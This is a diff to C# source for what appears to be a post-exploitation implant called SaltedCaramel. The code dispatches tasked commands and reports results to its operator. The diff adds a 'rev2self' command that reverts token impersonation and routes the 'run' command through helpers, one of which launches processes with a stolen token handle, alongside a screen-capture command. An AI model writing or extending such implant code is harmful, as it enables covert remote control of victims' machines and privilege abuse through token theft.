@@ -158,48 +158,14 @@ namespace SaltedCaramel
                 implant.PostResponse(response);
                 implant.SendComplete(this.id);
             }
+            else if (this.command == "rev2self")
+                Token.Revert();
             else if (this.command == "run")
             {
-                // TODO: Figure out how to hook StandardError and StandardOutput at the same time
-                string[] split = this.@params.Trim().Split(' ');
-                string argString = string.Join(" ", split.Skip(1).ToArray());
-                ProcessStartInfo startInfo = new ProcessStartInfo();
                 if (implant.hasAlternateToken() == true)
-                    startInfo.WorkingDirectory = "C:\\Temp";
-                startInfo.FileName = split[0];
-                startInfo.Arguments = argString;
-                startInfo.UseShellExecute = false;
-                startInfo.RedirectStandardOutput = true;
-                startInfo.CreateNoWindow = true;
-
-                Process proc = new Process();
-                proc.StartInfo = startInfo;
-
-                string procOutput = "";
-                try
-                {
-                    Debug.WriteLine("[-] DispatchTask - Tasked to start process " + startInfo.FileName);
-                    proc.Start();
-
-                    while (!proc.StandardOutput.EndOfStream)
-                    {
-                        string line = proc.StandardOutput.ReadLine();
-                        procOutput += line + "\n";
-                    }
-
-                    // Strip unnecessary newline
-                    // TODO: fix the need for this
-                    procOutput = procOutput.TrimEnd();
-                    proc.WaitForExit();
-                    TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(procOutput), this.id);
-                    implant.PostResponse(response);
-                    implant.SendComplete(this.id);
-                }
-                catch (Exception e)
-                {
-                    Debug.WriteLine("[!] DispatchTask - ERROR starting process: " + e.Message);
-                    implant.SendError(this.id, e.Message);
-                }
+                    SaltedCaramelProcess.StartProcessWithToken(Token.stolenHandle, implant, this);
+                else
+                    SaltedCaramelProcess.StartProcess(implant, this);
             }
             else if (this.command == "screencapture")
             {
